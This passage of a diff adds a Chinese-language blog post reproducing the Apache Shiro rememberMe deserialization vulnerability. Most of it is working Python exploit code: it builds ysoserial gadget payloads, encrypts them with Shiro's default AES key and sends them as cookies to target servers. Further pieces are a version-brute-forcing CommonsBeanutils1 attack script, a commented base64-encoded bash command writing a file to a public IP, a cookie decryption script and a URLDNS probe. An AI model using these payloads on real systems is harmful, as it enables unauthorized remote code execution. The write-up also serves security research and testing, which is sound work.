       target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(JRMPServerIp, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(JRMPServerIp, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    <span class="comment">#java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '1.2.3.4:12345'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'JRMPClient'</span>, JRMPServerIp],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    <span class="comment">#poc('http://47.106.182.92:8080/', 'bash -c &#123;echo,ZWNobyBgd2hvYW1pYCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9oYWNrLmpzcA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8888/samples_web_war_exploded/'</span>, <span class="string">'127.0.0.1:12345'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然而本地测试的时候并未复现中，应该是gadget的问题，因为在加了commons-conllections4.0的环境用ysoserial的CommonsCollections2就可以成功。难道是环境没装好？</p>
+<p><strong>后来仔细看了一下，确实是环境的问题，具体原因是打包成war的时候只会把compile和runtime的打包，而test的属于开发阶段需要使用的，从而不会打进去，而这里common-conllectons恰好属于test。所以生成环境中根本没有common-conllectons，因此是不可能打成功的</strong>。<br><img src="./1568551376077.png" alt="Alt text"><br><img src="./1568796705290.png" alt="Alt text"></p>
+<p>此外注意到原生shiro，还自带CommonsBeanutils1.8.3，而CommonsBeanutils历史上是有gadget。<br><img src="./1568646188492.png" alt="Alt text"><br><img src="./1568646208505.png" alt="Alt text"></p>
+<p>改了ysoserial的pom CommonsBeanutils成1.8.3又爆了新的错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] from the thread context, current, or system&#x2F;application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br><span class="line">	at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148)</span><br><span class="line">	at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53)</span><br><span class="line">	... 51 more</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>所以立个flag：纯原生的shiro只是一个反序列化的触发点，没有完整gadget。因此需要结合其它依赖shiro的项目才有可能达到RCE的效果（比如jeecms）</strong></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># pip install pycrypto</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">def decode_rememberme_file(filename):</span><br><span class="line">    with open(filename, &#39;rb&#39;) as fpr:</span><br><span class="line">        key  &#x3D;  &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;</span><br><span class="line">        mode &#x3D;  AES.MODE_CBC</span><br><span class="line">        IV   &#x3D; b&#39; &#39; * 16</span><br><span class="line">        encryptor &#x3D; AES.new(base64.b64decode(key), mode, IV&#x3D;IV)</span><br><span class="line">        remember_bin &#x3D; encryptor.decrypt(fpr.read())</span><br><span class="line">    return remember_bin</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;decrypt.bin&quot;, &#39;wb+&#39;) as fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[1]))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decrypt.py cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D; | xxd</span><br></pre></td></tr></table></figure>
+
+<h3 id="DNS-gadget验证漏洞"><a href="#DNS-gadget验证漏洞" class="headerlink" title="DNS gadget验证漏洞"></a>DNS gadget验证漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar URLDNS http:&#x2F;&#x2F;yoursite</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取全版本解决SUID问题"><a href="#获取全版本解决SUID问题" class="headerlink" title="获取全版本解决SUID问题"></a>获取全版本解决SUID问题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen,PIPE</span><br><span class="line"><span class="keyword">from</span> xml.dom.minidom <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">repo_url = <span class="string">"http://uk.maven.org/maven2/commons-beanutils/commons-beanutils/maven-metadata.xml"</span></span><br><span class="line">mvn_home = <span class="string">"/Users/cengsiqi/.m2/repository"</span></span><br><span class="line">yso_path = <span class="string">"/Users/cengsiqi/Desktop/pentest/ysoserial/target/classes"</span></span><br><span class="line">gadget = <span class="string">"CommonsBeanutils1"</span></span><br><span class="line">command = <span class="string">'touch /tmp/hack_shiro_CommonsBeanutils1'</span></span><br><span class="line"><span class="comment">#key = "kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">key = <span class="string">"4AvVhmFLUs0KTA3Kprsdag=="</span></span><br><span class="line">target = <span class="string">"http://172.16.247.129:8080/"</span></span><br><span class="line">iv = uuid.uuid4().bytes</span><br><span class="line"></span><br><span class="line">res = requests.get(repo_url)</span><br><span class="line">html = res.content</span><br><span class="line">root = parseString(html.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">groupId = root.getElementsByTagName(<span class="string">"groupId"</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">artifactId = root.getElementsByTagName(<span class="string">"artifactId"</span>)[<span class="number">0</span>].firstChild.data</span><br><span class="line">print(groupId, artifactId)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(payload)</span>:</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(payload)</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> root.getElementsByTagName(<span class="string">"version"</span>):</span><br><span class="line">    version = i.firstChild.data</span><br><span class="line">    <span class="keyword">if</span> version.find(<span class="string">'-pre'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    jar_path = mvn_home + <span class="string">'/'</span> + groupId.replace(<span class="string">'.'</span>, <span class="string">'/'</span>) + <span class="string">'/'</span> + artifactId + <span class="string">'/'</span> + version + <span class="string">'/'</span> + artifactId + <span class="string">'-'</span> + version + <span class="string">'.jar'</span></span><br><span class="line">    print(jar_path)</span><br><span class="line">    mvncmd = <span class="string">"mvn dependency:get -DremoteRepositories=http://repo1.maven.org/maven2/ -DgroupId=%s -DartifactId=%s -Dversion=%s"</span> \</span><br><span class="line">          % (groupId, artifactId, version)</span><br><span class="line">    child = Popen(mvncmd, shell=<span class="literal">True</span>, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    child.wait()</span><br><span class="line">    <span class="comment">#yso_path, mvn_home, jar_path, gadget, command</span></span><br><span class="line">    cmd2 = <span class="string">"&#123;0&#125;:&#123;2&#125;:&#123;1&#125;/net/iharder/base64/2.3.9/base64-2.3.9.jar:&#123;1&#125;/commons-io/commons-io/2.6/commons-io-2.6.jar:&#123;1&#125;/org/reflections/reflections/0.9.9/reflections-0.9.9.jar:&#123;1&#125;/com/google/guava/guava/15.0/guava-15.0.jar:&#123;1&#125;/com/google/code/findbugs/annotations/2.0.1/annotations-2.0.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api/2.1.1/shrinkwrap-resolver-api-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi/2.1.1/shrinkwrap-resolver-spi-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven/2.1.1/shrinkwrap-resolver-api-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven/2.1.1/shrinkwrap-resolver-spi-maven-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-api-maven-archive/2.1.1/shrinkwrap-resolver-api-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-api/1.2.1/shrinkwrap-api-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven/2.1.1/shrinkwrap-resolver-impl-maven-2.1.1.jar:&#123;1&#125;/org/eclipse/aether/aether-api/0.9.0.M2/aether-api-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-impl/0.9.0.M2/aether-impl-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-spi/0.9.0.M2/aether-spi-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-util/0.9.0.M2/aether-util-0.9.0.M2.jar:&#123;1&#125;/org/eclipse/aether/aether-connector-wagon/0.9.0.M2/aether-connector-wagon-0.9.0.M2.jar:&#123;1&#125;/org/apache/maven/maven-aether-provider/3.1.1/maven-aether-provider-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model/3.1.1/maven-model-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-model-builder/3.1.1/maven-model-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-component-annotations/1.5.5/plexus-component-annotations-1.5.5.jar:&#123;1&#125;/org/apache/maven/maven-repository-metadata/3.1.1/maven-repository-metadata-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings/3.1.1/maven-settings-3.1.1.jar:&#123;1&#125;/org/apache/maven/maven-settings-builder/3.1.1/maven-settings-builder-3.1.1.jar:&#123;1&#125;/org/codehaus/plexus/plexus-interpolation/1.19/plexus-interpolation-1.19.jar:&#123;1&#125;/org/codehaus/plexus/plexus-utils/3.0.15/plexus-utils-3.0.15.jar:&#123;1&#125;/org/sonatype/plexus/plexus-sec-dispatcher/1.3/plexus-sec-dispatcher-1.3.jar:&#123;1&#125;/org/sonatype/plexus/plexus-cipher/1.4/plexus-cipher-1.4.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-provider-api/2.6/wagon-provider-api-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-file/2.6/wagon-file-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-lightweight/2.6/wagon-http-lightweight-2.6.jar:&#123;1&#125;/org/apache/maven/wagon/wagon-http-shared/2.6/wagon-http-shared-2.6.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-impl-maven-archive/2.1.1/shrinkwrap-resolver-impl-maven-archive-2.1.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-impl-base/1.2.1/shrinkwrap-impl-base-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/shrinkwrap-spi/1.2.1/shrinkwrap-spi-1.2.1.jar:&#123;1&#125;/org/jboss/shrinkwrap/resolver/shrinkwrap-resolver-spi-maven-archive/2.1.1/shrinkwrap-resolver-spi-maven-archive-2.1.1.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.plexus/0.0.0.M5/org.eclipse.sisu.plexus-0.0.0.M5.jar:&#123;1&#125;/org/sonatype/sisu/sisu-guice/3.1.0/sisu-guice-3.1.0-no_aop.jar:&#123;1&#125;/org/eclipse/sisu/org.eclipse.sisu.inject/0.0.0.M5/org.eclipse.sisu.inject-0.0.0.M5.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-javac/2.3/plexus-compiler-javac-2.3.jar:&#123;1&#125;/org/codehaus/plexus/plexus-compiler-api/2.3/plexus-compiler-api-2.3.jar:&#123;1&#125;/org/javassist/javassist/3.19.0-GA/javassist-3.19.0-GA.jar:&#123;1&#125;/commons-codec/commons-codec/1.9/commons-codec-1.9.jar:&#123;1&#125;/org/jenkins-ci/main/remoting/2.55/remoting-2.55.jar:&#123;1&#125;/org/jenkins-ci/constant-pool-scanner/1.2/constant-pool-scanner-1.2.jar:&#123;1&#125;/org/jboss/logging/jboss-logging/3.3.0.Final/jboss-logging-3.3.0.Final.jar:&#123;1&#125;/org/jboss/remoting/jboss-remoting/4.0.19.Final/jboss-remoting-4.0.19.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-api/3.3.4.Final/xnio-api-3.3.4.Final.jar:&#123;1&#125;/org/jboss/jboss-common-core/2.5.0.Final/jboss-common-core-2.5.0.Final.jar:&#123;1&#125;/org/jboss/xnio/xnio-nio/3.3.4.Final/xnio-nio-3.3.4.Final.jar:&#123;1&#125;/org/jboss/sasl/jboss-sasl/1.0.5.Final/jboss-sasl-1.0.5.Final.jar:&#123;1&#125;/org/jboss/remotingjmx/remoting-jmx/2.0.1.Final/remoting-jmx-2.0.1.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-processor/1.2.0.Final/jboss-logging-processor-1.2.0.Final.jar:&#123;1&#125;/org/jboss/jdeparser/jdeparser/1.0.0.Final/jdeparser-1.0.0.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling/1.4.10.Final/jboss-marshalling-1.4.10.Final.jar:&#123;1&#125;/org/jboss/marshalling/jboss-marshalling-river/1.4.10.Final/jboss-marshalling-river-1.4.10.Final.jar:&#123;1&#125;/commons-collections/commons-collections/3.1/commons-collections-3.1.jar:&#123;1&#125;/org/beanshell/bsh/2.0b5/bsh-2.0b5.jar:&#123;1&#125;/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/commons-logging/commons-logging/1.1.1/commons-logging-1.1.1.jar:&#123;1&#125;/org/apache/commons/commons-collections4/4.0/commons-collections4-4.0.jar:&#123;1&#125;/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar:&#123;1&#125;/org/springframework/spring-core/4.1.4.RELEASE/spring-core-4.1.4.RELEASE.jar:&#123;1&#125;/org/springframework/spring-beans/4.1.4.RELEASE/spring-beans-4.1.4.RELEASE.jar:&#123;1&#125;/org/hibernate/hibernate-core/4.3.11.Final/hibernate-core-4.3.11.Final.jar:&#123;1&#125;/org/jboss/logging/jboss-logging-annotations/1.2.0.Beta1/jboss-logging-annotations-1.2.0.Beta1.jar:&#123;1&#125;/org/jboss/spec/javax/transaction/jboss-transaction-api_1.2_spec/1.0.0.Final/jboss-transaction-api_1.2_spec-1.0.0.Final.jar:&#123;1&#125;/dom4j/dom4j/1.6.1/dom4j-1.6.1.jar:&#123;1&#125;/xml-apis/xml-apis/1.0.b2/xml-apis-1.0.b2.jar:&#123;1&#125;/org/hibernate/common/hibernate-commons-annotations/4.0.5.Final/hibernate-commons-annotations-4.0.5.Final.jar:&#123;1&#125;/org/hibernate/javax/persistence/hibernate-jpa-2.1-api/1.0.0.Final/hibernate-jpa-2.1-api-1.0.0.Final.jar:&#123;1&#125;/antlr/antlr/2.7.7/antlr-2.7.7.jar:&#123;1&#125;/org/jboss/jandex/1.1.0.Final/jandex-1.1.0.Final.jar:&#123;1&#125;/org/springframework/spring-aop/4.1.4.RELEASE/spring-aop-4.1.4.RELEASE.jar:&#123;1&#125;/aopalliance/aopalliance/1.0/aopalliance-1.0.jar:&#123;1&#125;/net/sf/json-lib/json-lib/2.4/json-lib-2.4-jdk15.jar:&#123;1&#125;/commons-lang/commons-lang/2.5/commons-lang-2.5.jar:&#123;1&#125;/net/sf/ezmorph/ezmorph/1.0.6/ezmorph-1.0.6.jar:&#123;1&#125;/commons-fileupload/commons-fileupload/1.3/commons-fileupload-1.3.jar:&#123;1&#125;/org/apache/wicket/wicket-util/6.23.0/wicket-util-6.23.0.jar:&#123;1&#125;/org/apache/shiro/shiro-core/1.4.0/shiro-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-lang/1.4.0/shiro-lang-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-cache/1.4.0/shiro-cache-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-hash/1.4.0/shiro-crypto-hash-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-core/1.4.0/shiro-crypto-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-crypto-cipher/1.4.0/shiro-crypto-cipher-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-core/1.4.0/shiro-config-core-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-config-ogdl/1.4.0/shiro-config-ogdl-1.4.0.jar:&#123;1&#125;/org/apache/shiro/shiro-event/1.4.0/shiro-event-1.4.0.jar:~/.m2/repository/com/mchange/c3p0/0.9.5.2/c3p0-0.9.5.2.jar:&#123;1&#125;/com/mchange/mchange-commons-java/0.2.11/mchange-commons-java-0.2.11.jar:&#123;1&#125;/javax/servlet/javax.servlet-api/3.1.0/javax.servlet-api-3.1.0.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-impl/2.2.9/myfaces-impl-2.2.9.jar:&#123;1&#125;/org/apache/myfaces/core/myfaces-api/2.2.9/myfaces-api-2.2.9.jar:&#123;1&#125;/org/apache/geronimo/specs/geronimo-atinject_1.0_spec/1.0/geronimo-atinject_1.0_spec-1.0.jar:&#123;1&#125;/commons-digester/commons-digester/1.8/commons-digester-1.8.jar:&#123;1&#125;/xalan/xalan/2.7.2/xalan-2.7.2.jar:&#123;1&#125;/xalan/serializer/2.7.2/serializer-2.7.2.jar:&#123;1&#125;/rome/rome/1.0/rome-1.0.jar:&#123;1&#125;/jdom/jdom/1.0/jdom-1.0.jar:&#123;1&#125;/org/python/jython-standalone/2.5.2/jython-standalone-2.5.2.jar:&#123;1&#125;/rhino/js/1.7R2/js-1.7R2.jar:&#123;1&#125;/javassist/javassist/3.12.0.GA/javassist-3.12.0.GA.jar:&#123;1&#125;/org/jboss/weld/weld-core/1.1.33.Final/weld-core-1.1.33.Final.jar:&#123;1&#125;/org/jboss/weld/weld-api/1.1.Final/weld-api-1.1.Final.jar:&#123;1&#125;/org/jboss/weld/weld-spi/1.1.Final/weld-spi-1.1.Final.jar:&#123;1&#125;/javax/annotation/jsr250-api/1.0/jsr250-api-1.0.jar:&#123;1&#125;/org/jboss/spec/javax/interceptor/jboss-interceptors-api_1.1_spec/1.0.0.Beta1/jboss-interceptors-api_1.1_spec-1.0.0.Beta1.jar:&#123;1&#125;/org/slf4j/slf4j-ext/1.7.2/slf4j-ext-1.7.2.jar:&#123;1&#125;/ch/qos/cal10n/cal10n-api/0.7.7/cal10n-api-0.7.7.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-core/2.0.0.Final/jboss-interceptor-core-2.0.0.Final.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-spi/2.0.0.Final/jboss-interceptor-spi-2.0.0.Final.jar:&#123;1&#125;/javax/enterprise/cdi-api/1.0-SP1/cdi-api-1.0-SP1.jar:&#123;1&#125;/org/jboss/interceptor/jboss-interceptor-api/1.1/jboss-interceptor-api-1.1.jar:&#123;1&#125;/javax/inject/javax.inject/1/javax.inject-1.jar:&#123;1&#125;/javax/interceptor/javax.interceptor-api/3.1/javax.interceptor-api-3.1.jar:&#123;1&#125;/org/slf4j/slf4j-api/1.7.21/slf4j-api-1.7.21.jar:&#123;1&#125;/org/clojure/clojure/1.8.0/clojure-1.8.0.jar:&#123;1&#125;/com/vaadin/vaadin-server/7.7.14/vaadin-server-7.7.14.jar:&#123;1&#125;/com/vaadin/vaadin-sass-compiler/0.9.13/vaadin-sass-compiler-0.9.13.jar:&#123;1&#125;/org/w3c/css/sac/1.3/sac-1.3.jar:&#123;1&#125;/com/vaadin/external/flute/flute/1.3.0.gg2/flute-1.3.0.gg2.jar:&#123;1&#125;/com/vaadin/vaadin-shared/7.7.14/vaadin-shared-7.7.14.jar:&#123;1&#125;/org/jsoup/jsoup/1.8.3/jsoup-1.8.3.jar:&#123;1&#125;/org/mortbay/jasper/apache-el/8.0.27/apache-el-8.0.27.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar:&#123;1&#125;/com/nqzero/permit-reflect/0.3/permit-reflect-0.3.jar"</span>.format(yso_path, mvn_home, jar_path)</span><br><span class="line"></span><br><span class="line">    print(version)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-cp'</span>, cmd2, <span class="string">"ysoserial.GeneratePayload"</span>, gadget, command],stdout=subprocess.PIPE)</span><br><span class="line">    payload = popen.stdout.read()</span><br><span class="line">    base64_ciphertext = encode(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: base64_ciphertext.decode()&#125;, timeout=<span class="number">10</span>)</span><br><span class="line">        JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">        <span class="comment">#r = requests.get(target, cookies=&#123;'rememberMe': base64_ciphertext.decode()&#125;, timeout=10, proxies=&#123;'http':'127.0.0.1:8080'&#125;)</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a><br><a href="https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html" target="_blank" rel="noopener">https://joychou.org/java/apache-shiro-java-deserialize-vulnerability.html</a><br><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a><br><a href="https://www.cnblogs.com/Ahanu/p/5051090.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ahanu/p/5051090.html</a><br><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html</a><br><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener">https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>李三（cl0und）
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" title="shiro 反序列化复现">http://yoursite.com/2019/09/20/shiro 反序列化复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java/" rel="tag"># java</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/06/26/nginx%E7%9A%84%E7%A7%98%E5%AF%86wp/" rel="prev" title="nginx的秘密wp">
+      <i class="fa fa-chevron-left"></i> nginx的秘密wp
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/10/02/fastjson%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E7%A1%AC%E6%A0%B8%E8%B7%9F%E8%B8%AA/" rel="next" title="fastjson 反序列化流程硬核跟踪">
+      fastjson 反序列化流程硬核跟踪 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
